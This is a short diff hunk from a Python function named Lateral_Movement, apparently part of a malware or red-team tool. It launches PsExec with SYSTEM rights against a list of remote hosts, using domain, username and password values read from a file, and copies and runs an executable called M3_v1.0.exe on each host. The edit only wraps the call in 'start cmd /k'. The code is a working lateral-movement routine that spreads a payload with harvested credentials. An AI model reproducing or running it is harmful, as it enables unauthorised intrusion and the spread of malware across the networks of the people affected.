@@ -205,7 +205,7 @@ def Lateral_Movement():
         line = f.readlines()
         for i in range(len(list)):
             lines = line[0].split(".")
-            return_code = subprocess.Popen('C:\module2\DownloadFile-main\PsExec.exe -s \\\\' +
+            return_code = subprocess.Popen('start cmd /k C:\module2\DownloadFile-main\PsExec.exe -s \\\\' +
                                            list[i] + ' -u ' + lines[1] + '\\' + lines[0] + ' -p ' + lines[3] + '-c C:\module2\DownloadFile-main\M3_v1.0.exe')
         f.close()
 
